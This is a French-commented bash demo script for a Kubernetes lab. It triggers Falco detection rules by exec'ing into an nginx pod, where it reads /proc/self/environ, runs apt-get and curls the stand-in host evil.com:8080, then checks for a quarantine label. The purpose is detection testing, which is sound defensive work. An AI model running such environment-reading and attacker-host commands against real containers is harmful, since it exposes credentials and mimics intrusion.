#!/usr/bin/env bash
# Une seule démo sûre, alignée sur terraform/falco_rules.local.yaml
# (pas de malware, pas de persistance, timeout réseau 3 secondes).
set -euo pipefail

NAMESPACE="demo-app"
LABEL="app=nginx-demo"

echo "== 1. Trouver le pod nginx-demo =="
POD=$(kubectl get pods -n "$NAMESPACE" -l "$LABEL" -o jsonpath='{.items[0].metadata.name}')
if [ -z "$POD" ]; then
  echo "Aucun pod dans $NAMESPACE. Lancer Terraform d'abord."
  exit 1
fi
echo "Pod : $POD"

echo "== 2. Commande de démo (environ + apt-get + curl IOC lab, timeout 3s) =="
# Falco attendu (règles terraform/falco_rules.local.yaml) :
# - Unexpected process spawned in application container  (sh, curl si présent)
# - Baseline normal activity demo-app
# - Sensitive environment variable credential access     (/proc/self/environ)
# - Unexpected package manager execution                 (apt-get, image nginx Debian)
# - Suspicious outbound connection                       (curl port 8080 ; ignoré si curl absent)
kubectl exec -n "$NAMESPACE" "$POD" -- \
  sh -c 'cat /proc/self/environ; apt-get --version; curl -s --max-time 3 http://evil.com:8080/ || true'

echo "== 3. Vérifier le label de quarantaine (si score IA >= 70) =="
kubectl get pods -n "$NAMESPACE" --show-labels

echo "Fin. Voir aussi les logs du collector Flask."
